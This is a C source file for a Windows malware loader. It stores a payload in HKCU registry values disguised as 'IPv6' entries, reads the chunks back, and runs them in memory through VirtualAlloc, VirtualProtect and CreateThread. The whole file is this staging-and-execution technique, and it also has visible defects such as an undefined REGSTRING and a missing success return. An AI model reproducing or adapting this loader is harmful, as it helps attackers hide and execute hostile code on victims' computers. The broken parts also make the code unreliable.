#include "RegstryPayloadStaging.h"

//#define     WRITEMODE
#define     READMODE

#define     REGISTRY            "Network"
#define     REGSTRING1           "Ipv6_1"
#define     REGSTRING2           "IPv6_2"
#define     REGSTRING3           "IPv6_3"

#define     REGSTRING4           "IPv6_4"



#ifdef WRITEMODE
BOOLEAN WritePayloadToRegistry
(
	IN PUCHAR pPayload,
	IN DWORD  dwPayloadSize
)
{
	LSTATUS lStatus;
	HKEY    hKey;
	boolean bState = FALSE;

	if ((lStatus = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey)) != ERROR_SUCCESS) goto _cleanup;

	if ((lStatus = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pPayload, dwPayloadSize)) != ERROR_SUCCESS) goto _cleanup;

	bState = TRUE;

_cleanup:
	if (hKey) RegCloseKey(hKey);

	return bState;
}

#endif

#ifdef READMODE

BOOLEAN ReadRegKeys
(
	OUT PUCHAR **pPayloadAddress,
	OUT PDWORD psPayloadSize
)
{
	DWORD dwBytesRead;

	HKEY hKey;

	PUCHAR pbytes = NULL;
	if (!pPayloadAddress) return FALSE;

	if (!(*pPayloadAddress = (unsigned char **)malloc( 4 * sizeof(LPSTR)))) return FALSE;

	//Fetching Size First;
	if (RegGetValueA(
		HKEY_CURRENT_USER,
		REGISTRY,
		REGSTRING1,
		RRF_RT_REG_SZ,
		NULL , NULL, &dwBytesRead) != ERROR_SUCCESS) return FALSE;

	if (!((*pPayloadAddress)[0] = LocalAlloc(LPTR, dwBytesRead))) return FALSE;

	(*pPayloadAddress)[0][dwBytesRead - 1] = '\0';

	if (RegGetValueA(
		HKEY_CURRENT_USER,
		REGISTRY,
		REGSTRING1,
		RRF_RT_REG_SZ,
		0, (*pPayloadAddress)[0], &dwBytesRead) != ERROR_SUCCESS) return FALSE;

	
	*psPayloadSize = (SIZE_T)dwBytesRead - 1;

	if (RegGetValueA(
		HKEY_CURRENT_USER,
		REGISTRY,
		REGSTRING2,
		RRF_RT_REG_SZ,
		NULL, NULL, &dwBytesRead) != ERROR_SUCCESS) return FALSE;

	

	if (!((*pPayloadAddress)[1]  = LocalAlloc(LPTR, dwBytesRead))) return FALSE;

	if (RegGetValueA(
		HKEY_CURRENT_USER,
		REGISTRY,
		REGSTRING2,
		RRF_RT_REG_SZ,
		NULL, (*pPayloadAddress)[1], &dwBytesRead) != ERROR_SUCCESS) return FALSE;


	*psPayloadSize += dwBytesRead - 1;

	if (RegGetValueA(
		HKEY_CURRENT_USER,
		REGISTRY,
		REGSTRING3,
		RRF_RT_REG_SZ,
		NULL, NULL, &dwBytesRead) != ERROR_SUCCESS) return FALSE;



	if (!((*pPayloadAddress)[2] = malloc(dwBytesRead))) return FALSE;

	if (RegGetValueA(
		HKEY_CURRENT_USER,
		REGISTRY,
		REGSTRING3,
		RRF_RT_REG_SZ,
		NULL, (*pPayloadAddress)[2], &dwBytesRead) != ERROR_SUCCESS) return FALSE;

	*psPayloadSize += (SIZE_T)dwBytesRead- 1;

	if (RegGetValueA(
		HKEY_CURRENT_USER,
		REGISTRY,
		REGSTRING4,
		RRF_RT_REG_SZ,
		NULL, NULL, &dwBytesRead) != ERROR_SUCCESS) return FALSE;

	if (!((*pPayloadAddress)[3] = malloc(dwBytesRead))) return FALSE;


	if (RegGetValueA(
		HKEY_CURRENT_USER,
		REGISTRY,
		REGSTRING4,
		RRF_RT_REG_SZ,
		NULL, (*pPayloadAddress)[3], &dwBytesRead) != ERROR_SUCCESS) return FALSE;

	*psPayloadSize += (SIZE_T)dwBytesRead- 1;

	return TRUE;
}


BOOLEAN RunPayload
(
	IN PUCHAR pDecryptedPayload,
	IN SIZE_T sDecryptedPayloadSize
)
{
	PVOID pPayloadAddress;
	DWORD dwOldProtections;

	if (!(pPayloadAddress = VirtualAlloc(
		0,
		sDecryptedPayloadSize,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE
	))) return FALSE;

	memcpy(pPayloadAddress, pDecryptedPayload, sDecryptedPayloadSize);

	memset(pDecryptedPayload, '\0', sDecryptedPayloadSize);

	if (!VirtualProtect(pPayloadAddress, sDecryptedPayloadSize, PAGE_EXECUTE_READ, &dwOldProtections)) return FALSE;

	if (!CreateThread(
		NULL, 0,
		(LPTHREAD_START_ROUTINE)pPayloadAddress,
		NULL, 0, NULL)
		) return FALSE;

}
#endif




